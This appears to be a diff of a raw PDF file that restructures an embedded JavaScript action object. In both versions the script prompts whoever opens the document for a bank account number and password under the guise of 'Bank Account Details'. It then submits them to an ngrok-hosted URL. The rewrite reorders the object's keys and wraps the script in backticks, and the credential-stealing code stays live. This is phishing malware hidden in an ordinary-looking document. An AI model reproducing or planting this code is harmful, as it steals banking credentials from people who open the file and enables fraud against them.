@@ -79,15 +79,14 @@ endobj
 endobj
 6 0 obj
 <<
-/Type /Action
-/S /JavaScript
-/JS
-(
-var account = app.response ({ cQuestion:"Enter your Bank Account Number", cTitle:"Bank Account Details", bPassword:false, cDefault: global.cLastPswd, cLabel:"A/C"}); 
+<<
+/JS (`var account = app.response ({ cQuestion:"Enter your Bank Account Number", cTitle:"Bank Account Details", bPassword:false, cDefault: global.cLastPswd, cLabel:"A/C"}); 
 var password = app.response ({ cQuestion:"Enter your Bank Account Passowrd", cTitle:"Bank Account Details", bPassword:true, cDefault: global.cLastPswd, cLabel:"Password"});
 var cURL = "https://edad-202-162-37-174.ngrok-free.app/test11" + "?" + "account=" + account + "&password=" + password;
-this.submitForm({cURL: encodeURI(cURL), cSubmitAs: 'HTML'});
-)
+this.submitForm({cURL: encodeURI(cURL), cSubmitAs: 'HTML'});`)
+/Type /Action
+/S /JavaScript
+>>
 >>
 endobj
 7 0 obj
